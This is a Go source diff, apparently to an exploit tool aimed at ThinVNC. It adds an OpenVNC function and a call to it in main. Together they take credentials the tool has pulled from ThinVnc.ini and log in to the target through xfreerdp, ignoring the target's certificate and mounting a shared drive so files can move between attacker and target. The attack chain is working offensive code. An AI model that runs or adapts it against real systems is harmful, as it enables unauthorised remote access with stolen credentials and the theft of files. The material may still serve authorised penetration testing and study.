@@ -16,6 +16,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"os/exec"
 	"regexp"
 	"strings"
 	"time"
@@ -356,6 +357,71 @@ func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) 
 
 //============================================================
 //
+// Function Name: OpenVNC
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//  Function designed to connect to a specified target with
+//  a given username and password over VNC using xfreerdp.
+//
+// Input(s):
+//
+//  creds - CredStruct. credentials to connect with.
+//  target - string. target to connect to (including port).
+//
+// Return(s):
+//
+//  err - error. error or nil.
+//
+//============================================================
+func OpenVNC(creds CredStruct, target string) (err error) {
+	var command *exec.Cmd
+	var dirname string = "tmp_files"
+	var dirstr string = fmt.Sprintf("/drive:share,./%s", dirname)
+	var passtr string = fmt.Sprintf("/p:%s", creds.Password)
+	var tgtstr string = fmt.Sprintf("/v:%s", target)
+	var usrstr string = fmt.Sprintf("/u:%s", creds.Username)
+
+	//------------------------------------------------------------
+	// create directory in current directory to share files
+	// between attacking machine and target machine.
+	//------------------------------------------------------------
+	_, err = os.Stat(dirname)
+	if os.IsNotExist(err) {
+		err = os.Mkdir(dirname, 0755)
+		if err != nil {
+			return err
+		}
+	}
+
+	//------------------------------------------------------------
+	// setup xfreerdp connection command.
+	//
+	// this command will make the resolution dynamic, ignore the
+	// target cert, and create a shared directory within which you
+	// can share files between the attacker and target.
+	//------------------------------------------------------------
+	command = exec.Command("xfreerdp", usrstr, passtr, tgtstr, "/dynamic-resolution", "/cert:ignore", dirstr)
+	command.Stderr = nil
+	command.Stdout = nil
+	command.Stdin = nil
+
+	//------------------------------------------------------------
+	// make the connection.
+	//------------------------------------------------------------
+	SysMsgNB("connecting to target via VNC ...")
+	err = command.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+//============================================================
+//
 // Function Name: SaveContents
 //
 // Author: Thomas Osgood
@@ -479,6 +545,17 @@ func main() {
 			os.Exit(1)
 		}
 		SucMsg(fmt.Sprintf("Creds Found: \"%s:%s\"", creds.Username, creds.Password))
+
+		//============================================================
+		// connect to target via xfreerdp using credentials pulled
+		// from ThinVnc.ini.
+		//============================================================
+		err = OpenVNC(creds, domain)
+		if err != nil {
+			ErrMsg(err.Error())
+			os.Exit(1)
+		}
+		SucMsg("VNC session done")
 	} else {
 		contents, err = client.GetFile(targetfile, depth)
 		if err != nil {
